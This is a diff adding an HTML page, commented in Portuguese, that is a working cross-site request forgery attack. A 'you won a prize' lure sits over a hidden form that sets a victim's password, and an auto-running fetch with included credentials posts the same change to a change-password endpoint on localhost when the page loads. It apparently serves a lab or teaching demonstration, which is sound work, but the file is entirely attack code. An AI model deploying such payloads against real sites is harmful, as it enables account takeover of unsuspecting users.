@@ -1,0 +1,20 @@
+<!-- Esta página está hospedada em outro domínio (ex: atacante.com) -->
+<h2>Você ganhou um prêmio! Clique abaixo!</h2>
+
+<form action="http://localhost:8000/change-password.php" method="POST">
+    <input type="hidden" name="new_password" value="senha_injetada_123">
+    <button type="submit">Clique para ver seu prêmio</button>
+</form>
+
+<!-- OU com JavaScript automático -->
+<script>
+  // Envia a requisição automaticamente quando a vítima acessa a página
+  fetch("http://localhost:8000/change-password.php", {
+    method: "POST",
+    credentials: "include",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+    },
+    body: "new_password=senha_injetada_123"
+  });
+</script>
